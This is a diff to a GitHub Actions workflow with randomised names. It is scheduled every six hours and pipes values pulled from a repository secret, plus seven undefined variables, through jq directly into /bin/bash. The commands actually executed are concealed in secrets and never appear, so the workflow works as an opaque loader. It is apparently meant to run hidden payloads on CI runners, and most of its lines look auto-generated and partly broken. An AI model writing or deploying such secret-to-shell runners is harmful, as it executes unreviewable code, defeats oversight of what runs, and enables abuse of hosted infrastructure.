@@ -1,19 +1,25 @@
 name: wanghuaijue7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
+    - cron: '27 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wanghuaijue7654
         env:
-          ql7098: ${{ secrets.ql7098 }}
+          fau819: ${{ secrets.fau819 }}
         run: |
-          echo $ql7098 | jq -r .fegxz7254 | /bin/bash
-          echo $kjk42932 | jq -r .l13 | /bin/bash
-          echo $oorja34 | jq -r .a7 | /bin/bash
+          echo $fau819 | jq -r .gk0739 | /bin/bash
+          echo $lpx43802 | jq -r .o8 | /bin/bash
+          echo $gb29347 | jq -r .wn67715 | /bin/bash
+          echo $omstv81 | jq -r .egozg71265 | /bin/bash
+          echo $jskx42 | jq -r .vhvu357 | /bin/bash
+          echo $a27 | jq -r .jmcr72 | /bin/bash
+          echo $lld8552 | jq -r .ywju780 | /bin/bash
+          echo $msu5615 | jq -r .jxb81 | /bin/bash
 
